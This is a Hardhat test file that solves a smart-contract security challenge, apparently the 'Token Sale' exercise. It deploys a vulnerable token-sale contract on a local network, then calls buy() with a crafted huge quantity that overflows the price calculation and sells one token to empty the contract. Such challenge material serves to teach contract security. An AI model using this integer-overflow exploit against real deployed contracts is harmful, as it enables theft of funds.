const {ethers} = require("hardhat");
const hre = require("hardhat");
const {expect} = require("chai");


describe('[Challenge] Token Sales Contract', function () {

    let deployer, player,attacker;
    let baseContract, attackContract;


    before(async function () {
        /** SETUP SCENARIO */
        [deployer, player, attacker] = await ethers.getSigners();
        this.amount = 1000000;
        const baseContractFactory = await ethers.getContractFactory('TokenSaleChallenge', deployer);
        const attackContractFactory = await ethers.getContractFactory('AttackTokenSales', attacker);
        const payment = hre.ethers.utils.parseEther('1');
        baseContract = await baseContractFactory.deploy(player.address, {value: payment});
        attackContract = await attackContractFactory.deploy(baseContract.address);
        await baseContract.deployed();
        await attackContract.deployed();
        expect(
            await baseContract.isComplete()
        ).to.equal(false);
    });

    it('Exploit Token Sales Attack', async function () {
        /** CODE YOUR EXPLOIT HERE */
        await baseContract.buy(ethers.BigNumber.from("115792089237316195423570985008687907853269984665640564039458"), {value: ethers.BigNumber.from("415992086870360064")});
        await baseContract.sell(1);

    });

    after(async function () {
        /** SUCCESS CONDITIONS */
        expect(
            await baseContract.isComplete()
        ).to.be.equal(true);


    });
});